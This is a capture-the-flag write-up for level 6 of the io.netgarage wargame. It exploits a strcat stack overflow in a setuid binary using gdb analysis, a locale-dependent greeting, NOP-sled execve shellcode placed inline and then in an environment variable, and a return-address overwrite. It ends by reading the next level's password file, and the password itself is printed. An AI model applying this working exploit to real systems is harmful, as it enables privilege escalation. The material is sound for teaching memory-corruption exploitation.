---

title: Level 6
link: ssh level6@io.netgarage.org

---

The vulnerability of this challenge resides in the `strcat` instruction:

strcat(greeting, user.name);

We can demonstrate that quite easily with:

    $ gdb level06
    (gdb) r $(python -c "print 'A'*40 + ' ' + 'B'*40")
    Starting program: /levels/level06 $(python -c "print 'A'*40 + ' ' + 'B'*40")
    /bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
    Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
        Program received signal SIGSEGV, Segmentation fault.
    0x080486b2 in main ()

Why is that?

When you create a structure in C, the fields of that structure share a contiguous space in memory, e.g.:

    #include <stdio.h>
    #include <string.h>

        typedef struct User {
            char name[10];
            char password[10];
        } User;

    void debugUser(User *user){
        int x;

        printf("Displayed: %s\n", user->name);

        for(x = 0; x < 20; x ++){
            printf("%x ", (int)(user->name + x)[0]);
        }
        printf("\n");
    }

    int main(){

        User user;
        strncpy(user.name, "< 10", sizeof(user.name));
        strncpy(user.password,  "invisible", sizeof(user.password));
        debugUser(&user);

        strncpy(user.name, "= 10 chars", sizeof(user.name));
        strncpy(user.password,  "visible", sizeof(user.password));
        debugUser(&user);

        user.name[9] = 0;
        debugUser(&user);

        return 0;
    }

In this example, we setup a structure in which both fields have a size of 10. If you fill the first one with less than 10 chars, the second one won't be displayed, but if you fill the first field with exactly its size, there won't be any termination byte finishing the first string. So when you `printf` the whole string (with both fields) will be displayed:

    Displayed: < 10
    3c 20 31 30 0 0 0 0 0 0 69 6e 76 69 73 69 62 6c 65 0
                ^- This breaks the first string

    Displayed: = 10 charsvisible
    3d 20 31 30 20 63 68 61 72 73 76 69 73 69 62 6c 65 0 0 0
      no null byte to break the string until this one -^

    Displayed: = 10 char
    3d 20 31 30 20 63 68 61 72 0 76 69 73 69 62 6c 65 0 0 0
     manually added null byte -^

For the challenge, the flow of data is the following:

    input: name password
    greeting = "Hi " + name
    print greeting

But because we use `strcat` for the string concatenation, the whole string is appened to the greeting buffer, so if the name is exactly 40 chars, then the password will be added as well. This results in a total possible string of 72 chars, which is 8 more than the greeting buffer! Here's our overflow.

We are still limited in the size of our possible payload, but we know we can inject 8 bytes into memory, which is enough to pwn this executable.

Let's look at the memory during execution with `gdb`:

    level6@io:/levels$ gdb level06
    (gdb) disass main
    ...
    0x080486aa <+279>:   call   0x804851c <greetuser>
    0x080486af <+284>:   lea    -0xc(%ebp),%esp
    ...
    (gdb) disass greetuser
    ...
    0x0804857e <+98>:    mov    %eax,(%esp)
    0x08048581 <+101>:   call   0x80483d0 <strcat@plt>
    0x08048586 <+106>:   lea    -0x48(%ebp),%eax
    0x08048589 <+109>:   mov    %eax,(%esp)
    0x0804858c <+112>:   call   0x80483f0 <puts@plt>
    0x08048591 <+117>:   leave
    0x08048592 <+118>:   ret
    End of assembler dump.
    (gdb) b *0x08048581
    Breakpoint 1 at 0x8048581
    (gdb) b *0x08048591
    Breakpoint 2 at 0x8048591
    (gdb) r $(python -c "print 'A'*40 + ' ' + 'B'*32")
    Breakpoint 1, 0x08048581 in greetuser ()
    (gdb) x/44wx $esp
    0xbffffae0:     0xbffffaf0      0xbffffb40      0xbffffb04      0x0804993c
    0xbffffaf0:     0x00206948      0x08048208      0xbffffcd4      0xb7e50852
    0xbffffb00:     0xbfffff4d      0xb7e27a48      0x00000002      0xb7e2d438
    0xbffffb10:     0x08048258      0xbffffb90      0x00000000      0xbffffbdc
    0xbffffb20:     0xbffffbf8      0xb7ff2fe0      0x00000047      0xb7e9b920
    0xbffffb30:     0xb7e9b957      0x00000000      0xbffffbf8      0x080486af
    0xbffffb40:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb50:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb60:     0x41414141      0x41414141      0x42424242      0x42424242
    0xbffffb70:     0x42424242      0x42424242      0x42424242      0x42424242
    0xbffffb80:     0x42424242      0x42424242      0x00000000      0x080482da

A few things we can see in memory:

- 0xbffffaf0 is the start of our buffer:

    (gdb) x/s 0xbffffaf0
    0xbffffaf0:     "Hi "

- 0xbffffb40 is the start of our user structure:

    (gdb) x/s 0xbffffb40
    0xbffffb40:     'A' <repeats 40 times>, 'B' <repeats 32 times>

- 0xbffffb3c is the return address of the function (if you look up the `disass main`, it's the instruction following the call to `greetuser`:

    (gdb) x/xw 0xbffffb3c
    0xbffffb3c:     0x080486af

This is before calling `strcat`, and after:

    (gdb) c
    Continuing.
    Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

    Breakpoint 2, 0x08048591 in greetuser ()
    (gdb) x/44wx $esp
    0xbffffae0:     0xbffffaf0      0xbffffb40      0xbffffb04      0x0804993c
    0xbffffaf0:     0x41206948      0x41414141      0x41414141      0x41414141
    0xbffffb00:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb10:     0x41414141      0x41414141      0x42414141      0x42424242
    0xbffffb20:     0x42424242      0x42424242      0x42424242      0x42424242
    0xbffffb30:     0x42424242      0x42424242      0x00424242      0x080486af
    0xbffffb40:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb50:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb60:     0x41414141      0x41414141      0x42424242      0x42424242
    0xbffffb70:     0x42424242      0x42424242      0x42424242      0x42424242
    0xbffffb80:     0x42424242      0x42424242      0x00000000      0x080482da

You can see clearly the string was copied across to the buffer, from the start of the 'A', to the end of the 'B'. But something is not quite right: we didn't wrote over the return address: the buffer is too small!

Fortunately, there is another parameter in this challenge that will solve that: changing the greeting prefix. Depending on the string present in the env variable `LANG` the message will change to a french or German one. Let's see that in action:

    (gdb) set environment LANG=fr
    (gdb) r $(python -c "print 'A'*40 + ' ' + 'B'*32")
    Starting program: /levels/level06 $(python -c "print 'A'*40 + ' ' + 'B'*32")
    /bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)

    Breakpoint 1, 0x08048581 in greetuser ()
    (gdb) c
    Continuing.
    Bienvenue AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

    Breakpoint 2, 0x08048591 in greetuser ()
    (gdb) x/44wx $esp
    0xbffffaf0:     0xbffffb00      0xbffffb50      0xbffffb14      0x0804993c
    0xbffffb00:     0x6e656942      0x756e6576      0x41412065      0x41414141
    0xbffffb10:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb20:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb30:     0x42424141      0x42424242      0x42424242      0x42424242
    0xbffffb40:     0x42424242      0x42424242      0x42424242      0x42424242
    0xbffffb50:     0x41004242      0x41414141      0x41414141      0x41414141
    0xbffffb60:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb70:     0x41414141      0x41414141      0x42424242      0x42424242
    0xbffffb80:     0x42424242      0x42424242      0x42424242      0x42424242
    0xbffffb90:     0x42424242      0x42424242      0x00000000      0x080482da

    And indeed, we wrote over the return address:

    (gdb) c
    Continuing.

    Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

    We have our overflow, now let's get a payload somewhere in memory.

    We're going to use the shellcode found here: http://shell-storm.org/shellcode/files/shellcode-827.php
    It's so small that it can fit in the `name` field of the user. And because we know where the field is in memory, we can reference it quite easily. Let's do that:

    First, let's find a suitable address to jump to and let's find the correct length we need to link the payload successfully. With the french greeting message, we can roll with:

    (gdb) r $(python -c "print '\x90'*17 + 'A'*23 + ' ' + 'B'*26 + 'CDEF'")
    Starting program: /levels/level06 $(python -c "print '\x90'*17 + 'A'*23 + ' ' + 'B'*26 + 'CDEF'")
    /bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
    Bienvenue AAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBCDEF

Breakpoint 2, 0x08048591 in greetuser ()
    (gdb) x/44 $esp
    0xbffffaf0:     0xbffffb00      0xbffffb50      0xbffffb14      0x0804993c
    0xbffffb00:     0x6e656942      0x756e6576      0x90902065      0x90909090
    0xbffffb10:     0x90909090      0x90909090      0x41909090      0x41414141
    0xbffffb20:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb30:     0x42424141      0x42424242      0x42424242      0x42424242
    0xbffffb40:     0x42424242      0x42424242      0x42424242      0x46454443
    0xbffffb50:     0x90909000      0x90909090      0x90909090      0x90909090
    0xbffffb60:     0x41414190      0x41414141      0x41414141      0x41414141
    0xbffffb70:     0x41414141      0x41414141      0x42424242      0x42424242
    0xbffffb80:     0x42424242      0x42424242      0x42424242      0x42424242
    0xbffffb90:     0x44434242      0x00004645      0x00000000      0x080482da

    We can see that the return address has been overridden with `0x46454443`, the 'CDEF' we added at the end of the payload. Then the NOP sled makes it easy to select an address, and we still have 23 bytes available for our payload. Let's select the address `0xbffffb10`:


    (gdb) r $(python -c "print '\x90'*17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + ' ' + 'B'*26 + '\x10\xfb\xff\xbf'")
    Starting program: /levels/level06 $(python -c "print '\x90'*17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + ' ' + 'B'*26 + '\x10\xfb\xff\xbf'")
    /bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
    Bienvenue 1Ph//shh/binS̀BBBBBBBBBBBBBBBBBBBBBBBBBB

Breakpoint 2, 0x08048591 in greetuser ()
    (gdb) x/44 $esp
    0xbffffaf0:     0xbffffb00      0xbffffb50      0xbffffb14      0x0804993c
    0xbffffb00:     0x6e656942      0x756e6576      0x90902065      0x90909090
    0xbffffb10:     0x90909090      0x90909090      0x31909090      0x2f6850c0
    0xbffffb20:     0x6868732f      0x6e69622f      0x5350e389      0x0bb0e189
    0xbffffb30:     0x424280cd      0x42424242      0x42424242      0x42424242
    0xbffffb40:     0x42424242      0x42424242      0x42424242      0xbffffb10
    0xbffffb50:     0x90909000      0x90909090      0x90909090      0x90909090
    0xbffffb60:     0x50c03190      0x732f2f68      0x622f6868      0xe3896e69
    0xbffffb70:     0xe1895350      0x80cd0bb0      0x42424242      0x42424242
    0xbffffb80:     0x42424242      0x42424242      0x42424242      0x42424242
    0xbffffb90:     0xfb104242      0x0000bfff      0x00000000      0x080482da

The payload is in memory and the address is correct, let's hope it works:

    (gdb) c
    Continuing.
    process 8585 is executing new program: /bin/bash
    sh-4.3$ whoami
    level6

Nice! We have a shell, but the current user is still level6, that's because we're running from withing gdb, let's port that outside:

    level6@io:/levels$ LANG=fr; ./level06 $(python -c "print '\x90'*17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + ' ' + 'B'*26 + '\x08\xfb\xff\xbf'")
    Bienvenue 1Ph//shh/binS̀BBBBBBBBBBBBBBBBBBBBBBBBBB
    Segmentation fault

Hmm, it seems that the passed address is not valid, or at least that it's not where the NOP sled is stored.

Let's try with env variable instead.

To get the memory address of an environment variable I used this very simple script:

    #include <stdlib.h>
    #include <stdio.h>

    int main(int argc, char *argv[]) {
        printf("%s => %p\n", argv[1], getenv(argv[1]));
        return 0;
    }

After being compiled, we can use it like so:

    level6@io:/tmp/aa$ ./getenv LANG
    LANG => 0xbfffff5e

Because the position of the shellcode in memory will depends on the other environment variables, let's export our `LANG` now:

    level6@io:/levels$ export LANG=fr 

Let's export our shellcode in the `SHELLCODE` environment variable and get its address:

    level6@io:/levels$ export SHELLCODE=$(python -c "print '\x90'*40 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
    level6@io:/levels$ /tmp/aa/getenv SHELLCODE
    SHELLCODE => 0xbffffe09

And finally let's use the payload previously found with the address. To add a bit of security we can use an address inside the NOP sled, in my case I used `0xbffffe08`.

    level6@io:/levels$ ./level06 $(python -c "print 'A'*40 + ' ' + 'B'*26 + '\x08\xfe\xff\xbf'")
    Bienvenue AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBB
    sh-4.3$ exit
    sh-4.3$ whoami
    level7
    sh-4.3$ cat /home/level7/.pass
    U3A6ZtaTub14VmwV
    sh-4.3$ exit

> U3A6ZtaTub14VmwV
